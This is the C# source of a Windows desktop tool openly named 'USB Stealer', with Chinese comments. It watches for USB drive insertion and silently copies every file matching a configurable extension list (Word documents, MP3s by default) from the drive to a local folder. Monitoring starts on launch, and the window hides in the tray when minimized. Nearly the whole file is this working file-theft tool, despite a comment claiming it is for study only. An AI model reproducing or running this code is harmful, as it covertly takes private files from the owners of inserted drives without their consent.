using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace USB_Stealer
{
    public partial class MainForm : Form
    {
        #region 常量
        // 注意：扩展名列表不应含有';'字符，否则会报错
        private const string PATHTEXT = "目标路径";
        private const string EXTTEXT = "扩展名列表";
        private const string DEF_PATH = "D:\\1UsbStealerPlatinum";
        private readonly string[] DEF_EXT = new string[] { ".doc", ".docx", "mp3" };
        #endregion

        public MainForm()
        {
            InitializeComponent();

            // 防止跨线程调用UI的函数导致报错
            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = false;
        }

        // 窗口初始化
        private void MainForm_Load(object sender, EventArgs e)
        {
            ConsoleSendOut("窗口初始化完毕。");

            // 配置读取
            try
            {
                string opitionTxtPath = @"UsbStealer.opt";
                FileStream opitionTxtStream;
                byte[] bytes;
                if (!File.Exists(opitionTxtPath))
                {
                    // 配置文件不存在，创建默认配置文件
                    opitionTxtStream = new FileStream(opitionTxtPath, FileMode.Create, FileAccess.Write);
                    string ExtListString = string.Empty;
                    ExtListString = string.Join(";", DEF_EXT);
                    string message = $"PathTo={DEF_PATH}\nExtList={ExtListString}";
                    bytes = Encoding.UTF8.GetBytes(message);
                    opitionTxtStream.Write(bytes, 0, bytes.Length);
                    opitionTxtStream.Flush();
                    opitionTxtStream.Close();
                }
                // 配置文件存在，读取配置文件
                opitionTxtStream = new FileStream(opitionTxtPath, FileMode.Open, FileAccess.Read);
                bytes = new byte[opitionTxtStream.Length];
                opitionTxtStream.Read(bytes, 0, bytes.Length);
                string opitionTxt = Encoding.UTF8.GetString(bytes);
                string[] opitionTxtList = opitionTxt.Split('\n');
                foreach (string opitionItem in opitionTxtList)
                {
                    // 参数映射变量   参数 -> 变量
                    string[] opition = opitionItem.Split('=');
                    switch (opition[0])
                    {
                        case "PathTo":
                            Opition.pathTo = opition[1];
                            break;
                        case "ExtList":
                            Opition.extList = opition[1].Split(';');
                            break;
                        default:
                            break;
                    }
                }
                opitionTxtStream.Close();

            }
            catch (Exception ex)
            {
                ConsoleSendOut($"读取配置失败：{ex}");
                ConsoleSendOut($"将采用默认配置...");

                Opition.pathTo = DEF_PATH;
                Opition.extList = DEF_EXT;
            }

            ShowSettingToTextBox();

            ConsoleSendOut($"载入配置完毕：\n         输出路径：{Opition.pathTo}\n           选定扩展名：{Opition.extList2String()}");
            ConsoleSendOut("软件版本：Alpha");
            ConsoleSendOut("欢迎使用 UsbStelerPlatinum");

            Opition.monitor = true;
            ConsoleSendOut("已开启监视");
        }

        #region USB Steler 文件扫描实现代码
        /// <summary>
        /// USB Stealer 实现区域，参考链接如下： 
        /// https://www.cnblogs.com/rr163/p/4259975.html ， 
        /// https://blog.csdn.net/wangzhichunnihao/article/details/79296100 ，
        /// https://blog.csdn.net/Sayesan/article/details/84340588 。
        /// 本软件及其代码仅供学习交流使用
        /// </summary>

        // 消息常量声明
        public const int WM_DEVICECHANGE = 0x219;//通知应用程序更改设备或计算机的硬件配置。
        public const int DBT_DEVICEARRIVAL = 0x8000;//U盘插入
        public const int DBT_CONFIGCHANGECANCELED = 0x0019;
        public const int DBT_CONFIGCHANGED = 0x0018;//当前配置发生了变化 
        public const int DBT_CUSTOMEVENT = 0x8006;
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;//设备已经被清除
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;
        public const int DBT_DEVICETYPESPECIFIC = 0x8005;//与设备有关的事件
        public const int DBT_DEVNODES_CHANGED = 0x0007;//设备节点发生了变化
        public const int DBT_QUERYCHANGECONFIG = 0x0017;
        public const int DBT_USERDEFINED = 0xFFFF;

        // 重载WndProc函数
        protected override void WndProc(ref Message m)
        {
            try
            {
                string UDeskName = "";
                if (Opition.monitor && m.Msg == WM_DEVICECHANGE)   // 判断是否开启监视 并 检测消息是否是设备发生变动
                {
                    switch (m.WParam.ToInt32())
                    {
                        case WM_DEVICECHANGE:
                            break;
                        case DBT_DEVICEARRIVAL: // 确认磁盘设备插入完毕
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                // 判断是否是移动磁盘，然后开启另一线程开始复制
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    String PathTo = Opition.pathTo.Replace("\\", "\\\\") + "\\\\";
                                    if (PathTo == $"{PATHTEXT}\\\\") PathTo = DEF_PATH + "\\\\";
                                    UDeskName = drive.Name.ToString();
                                    ConsoleSendOut("U盘已插入，盘符为: " + UDeskName);

                                    // 这段乱得要死而且实现方法太笨了，之后要改
                                    List<string> ULogicalNames = new List<string>();
                                    var IULogicalNames = from LogicalDriver in Directory.GetLogicalDrives()
                                                         where LogicalDriver == UDeskName
                                                         select new System.IO.DriveInfo(LogicalDriver).VolumeLabel;
                                    foreach (string ULogicalName in IULogicalNames)
                                    {
                                        ULogicalNames.Add(ULogicalName);
                                        ConsoleSendOut($"开始扫描： { ULogicalName }");
                                    }

                                    string[] para = new string[] { UDeskName, PathTo, ULogicalNames[0] };
                                    Thread t = new Thread(new ParameterizedThreadStart(CopyMethod));
                                    t.Start(para);
                                    break;
                                }
                            }
                            break;
                        // 磁盘卸载提示，一般情况是U盘被拔出
                        case DBT_DEVICEREMOVECOMPLETE:
                            ConsoleSendOut("U盘已拔出。");
                            break;
                        default:
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                ConsoleSendOut($"设备变动判断错误：{ex.ToString()}");
            }
            base.WndProc(ref m);
        }

        // 复制方法
        private void CopyMethod(object obj)
        {
            //此处对传进来的参数进行处理
            string[] strPath = (string[])obj;
            //调用CopyFolder方法
            CopyMoveDisk(strPath[0], strPath[1] + strPath[2] + '\\');
            DeleteEmptyFolders(strPath[1]);
            ConsoleSendOut($"扫描完毕！输出路径：{strPath[1]}");
        }

        // 复制文件和文件夹
        public void CopyMoveDisk(string from, string to)
        {
            try
            {
                // 如果复制到的地址不存在即当场创建一个
                if (!Directory.Exists(to))
                    Directory.CreateDirectory(to);

                // 复制限定文件

                // 复制子文件夹
                foreach (string sub in Directory.GetDirectories(from))
                {
                    if (!sub.Contains("System Volume Information"))
                    {
                        CopyMoveDisk(sub + "\\", to + Path.GetFileName(sub) + "\\");
                        //ConsoleSendOut($"复制文件夹: {sub} 成功!");
                    }

                }
                // 复制文件
                try
                {
                    string[] extList = { };
                    if (ExtTextBox.Text == EXTTEXT)
                    {
                        extList = DEF_EXT;
                    }
                    else
                    {
                        extList = Opition.extList;
                    };

                    foreach (string file in Directory.GetFiles(from))
                    {
                        // 注意：存在潜在的问题
                        foreach (string ext in extList)
                        {
                            if (file.ToLower().IndexOf(ext.ToLower()) != -1)
                            {
                                File.Copy(file, to + Path.GetFileName(file), true);
                                //ConsoleSendOut($"复制文件 {file} 成功!");
                            };
                        }
                    }
                }
                catch
                {
                    ConsoleSendOut("扩展名列表读取失败！请使用合法的扩展名列表。（例：.doc;.docx;.mp3;.png");
                }
            }

            catch (Exception ex)
            {
                ConsoleSendOut($"复制文件出错：{ex.ToString()}");
                ConsoleSendOut($"发生错误的路径：{from}");
            }
        }

        //清理空文件夹
        // 参考 https://codeleading.com/article/2652781042/ https://blog.csdn.net/BombZhang/article/details/88991902 ， 网上的搜索结果大部分都是互相抄（甚至连缩进和空格都抄没了），抄就算了，结果还不能处理多层套娃的空文件夹（最多支持2层，再多的就不会清理了）
        // 这篇文章写的可以正常清理空文件夹，好顶！（不过这个var的使用量还是我目前见过最多的（（（     （2022/2/11 21:32）
        void DeleteEmptyFolders(string parentFolder)
        {
            var dir = new DirectoryInfo(parentFolder);
            var subdirs = dir.GetDirectories("*.*", SearchOption.AllDirectories);

            foreach (var subdir in subdirs)
            {
                if (!Directory.Exists(subdir.FullName)) continue;

                var subFiles = subdir.GetFileSystemInfos("*.*", SearchOption.AllDirectories);

                var findFile = false;
                foreach (var sub in subFiles)
                {
                    findFile = (sub.Attributes & FileAttributes.Directory) == 0;

                    if (findFile) break;
                }

                if (!findFile) subdir.Delete(true);
            }
        }

        #endregion

        #region UI交互相关代码
        /// <summary>
        /// 实现了一些简单的提示功能
        /// 还有控制台的输出
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>

        // 控制台富文本框输入方法
        private void ConsoleSendOut(String msg)
        {
            String time = System.DateTime.Now.ToString("T");
            ConsoleRichText.AppendText($"<{time}> {msg}\n");
        }

        private void ExitButton_Click(object sender, EventArgs e)
        {
            // 退出
            System.Environment.Exit(0);
        }

        private void SettingButton_Click(object sender, EventArgs e)
        {
            ApplySetting();
            Opition2Files();
        }


        // 目标路径焦距交互效果
        private void PathTextBox_Click(object sender, EventArgs e)
        {
            if (PathTextBox.Text == PATHTEXT)
            {
                PathTextBox.Text = "";
                PathTextBox.Font = new Font(PathTextBox.Font, FontStyle.Regular);
                PathTextBox.ForeColor = Color.Black;
            }
        }
        private void PathTextBox_Leave(object sender, EventArgs e)
        {
            if (PathTextBox.Text == "")
            {
                PathTextBox.Font = new Font(PathTextBox.Font, FontStyle.Italic);
                PathTextBox.ForeColor = Color.DarkGray;
                PathTextBox.Text = PATHTEXT;
            }
        }

        // 扩展列表焦距交互效果
        private void ExtTestBox_Click(object sender, EventArgs e)
        {
            if (ExtTextBox.Text == EXTTEXT)
            {
                ExtTextBox.Text = "";
                ExtTextBox.Font = new Font(ExtTextBox.Font, FontStyle.Regular);
                ExtTextBox.ForeColor = Color.Black;
            }
        }

        private void ExtTestBox_Leave(object sender, EventArgs e)
        {
            if (ExtTextBox.Text == "")
            {
                ExtTextBox.Font = new Font(PathTextBox.Font, FontStyle.Italic);
                ExtTextBox.ForeColor = Color.DarkGray;
                ExtTextBox.Text = EXTTEXT;

            }
        }

        // 控制开始监视和停止监视
        private void StartButton_Click(object sender, EventArgs e)
        {
            Opition.monitor = true;
            ConsoleSendOut("开始监视");
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            Opition.monitor = false;
            ConsoleSendOut("停止监视");
        }

        // 主窗体最小化效果
        private void MainForm_SizeChanged(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized) //判断是否最小化
            {
                this.ShowInTaskbar = false; //不显示在系统任务栏
                notifyIcon.Visible = true; //托盘图标可见
            }
        }

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.ShowInTaskbar = true; //显示在系统任务栏
                this.WindowState = FormWindowState.Normal; //还原窗体
                notifyIcon.Visible = false; //托盘图标隐藏
            }
        }


        #endregion


        #region 设置类和初始化
        private static class Opition
        {
            public static string pathTo { get; set; }
            public static string[] extList { get; set; }

            public static string extList2String()
            {
                string extListString = string.Empty;
                extListString = string.Join(";", extList);
                return extListString;
            }

            public static bool monitor { get; set; }

        }

        // 应用设置参数
        private void ApplySetting()
        {
            Opition.pathTo = PathTextBox.Text;
            ConsoleSendOut($"设置目标路径为：{PathTextBox.Text}");
            Opition.extList = ExtTextBox.Text.Split(';');
            ConsoleSendOut($"设置扩展名列表为：{ExtTextBox.Text}");
        }

        private void ShowSettingToTextBox()
        {
            string extListString = string.Empty;
            extListString = string.Join(';'.ToString(), Opition.extList);
            PathTextBox.Text = Opition.pathTo;
            ExtTextBox.Text = extListString;

            PathTextBox.Font = new Font(PathTextBox.Font, FontStyle.Regular);
            PathTextBox.ForeColor = Color.Black;

            ExtTextBox.Font = new Font(ExtTextBox.Font, FontStyle.Regular);
            ExtTextBox.ForeColor = Color.Black;
        }

        // 输出配置
        private void Opition2Files()
        {
            try
            {
                // 我是傻逼，这里看了大半天没看出来一个超级简单的问题
                string opitionTxtPath = @"UsbStealer.opt";
                FileStream opitionTxtStream = new FileStream(opitionTxtPath, FileMode.OpenOrCreate, FileAccess.Write);
                string ExtListString = string.Empty;
                ExtListString = string.Join(";", Opition.extList);
                string message = $"PathTo={Opition.pathTo}\nExtList={ExtListString}";
                byte[] bytes = Encoding.UTF8.GetBytes(message);
                opitionTxtStream.Write(bytes, 0, bytes.Length);
                opitionTxtStream.Flush();
                opitionTxtStream.Close();
            }
            catch (Exception ex)
            {
                ConsoleSendOut($"保存配置发生错误：{ex}");
            }
        }

        // 重写关闭窗口的函数
        protected override void OnClosing(CancelEventArgs e)
        {
            // 关闭窗口
            base.OnClosing(e);
        }

        #endregion
    }
}
